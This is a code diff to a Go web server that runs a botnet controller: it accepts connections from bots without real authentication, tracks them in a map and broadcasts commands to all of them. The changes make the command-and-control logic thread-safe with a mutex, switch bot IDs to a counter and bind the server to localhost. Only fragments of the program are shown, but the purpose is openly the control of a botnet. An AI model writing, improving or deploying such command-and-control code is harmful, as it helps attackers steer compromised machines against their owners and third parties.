@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"golang.org/x/crypto/bcrypt"
@@ -19,7 +20,9 @@ import (
 
 var (
 	db             *sql.DB
-	botConnections = make(map[string]net.Conn)
+	botConnections = make(map[int]net.Conn)
+	botIDCounter   int
+	botMutex       sync.Mutex
 )
 
 const sessionName = "session"
@@ -32,7 +35,7 @@ type User struct {
 func main() {
 	// Initialize database connection
 	initDB()
-	serverAddress := "birdo.local:8080"
+	serverAddress := "127.0.0.1:8080"
 
 	// Start the botnet controller listener
 	go startBotListener()
@@ -223,7 +226,6 @@ func createUser(username, password string) error {
 		return err
 	}
 
-	// Incorrect number of placeholders in the INSERT statement
 	_, err = db.Exec("INSERT INTO users (username, password_hash) VALUES (?, ?)", username, hashedPassword)
 	return err
 }
@@ -294,28 +296,33 @@ func startBotListener() {
 		// Perform bot authentication (e.g., based on bot ID)
 		// For simplicity, assume bots authenticate successfully
 		botID := generateBotID()
+		botMutex.Lock()
 		botConnections[botID] = conn
+		botMutex.Unlock()
 
-		log.Printf("Bot %s connected from %s\n", botID, conn.RemoteAddr())
+		log.Printf("Bot %d connected from %s\n", botID, conn.RemoteAddr())
 
 		// Handle commands sent from this bot (in a separate goroutine)
 		go handleBotCommands(botID, conn)
 	}
 }
 
-// generateBotID generates a unique identifier for a bot.
-func generateBotID() string {
-	return "bot-" + strconv.FormatInt(time.Now().UnixNano(), 10)
+// generateBotID generates a unique identifier for a bot starting from 1.
+func generateBotID() int {
+	botMutex.Lock()
+	defer botMutex.Unlock()
+	botIDCounter++
+	return botIDCounter
 }
 
-// handleBotCommands handles commands received from a bot connection.
-func handleBotCommands(botID string, conn net.Conn) {
+// bot connection.
+func handleBotCommands(botID int, conn net.Conn) {
 	defer conn.Close()
 
 	scanner := bufio.NewScanner(conn)
 	for scanner.Scan() {
 		command := strings.TrimSpace(scanner.Text())
-		log.Printf("Received command from Bot %s: %s\n", botID, command)
+		log.Printf("Received command from Bot %d: %s\n", botID, command)
 
 		// Optionally parse and validate commands received from bots
 		// Process commands as needed
@@ -331,18 +338,23 @@ func handleBotCommands(botID string, conn net.Conn) {
 	}
 
 	// Remove bot from connections map upon disconnect
+	botMutex.Lock()
 	delete(botConnections, botID)
+	botMutex.Unlock()
 }
 
 // sendToBots sends a command to all connected bots.
 func sendToBots(command string) {
+	botMutex.Lock()
+	defer botMutex.Unlock()
+
 	for botID, conn := range botConnections {
 		_, err := conn.Write([]byte(command + "\n"))
 		if err != nil {
-			log.Printf("Error sending command to Bot %s: %v\n", botID, err)
+			log.Printf("Error sending command to Bot %d: %v\n", botID, err)
 			// Optionally handle failed command delivery (e.g., reconnect, logging)
 		} else {
-			log.Printf("Sent command to Bot %s: %s\n", botID, command)
+			log.Printf("Sent command to Bot %d: %s\n", botID, command)
 		}
 	}
 }
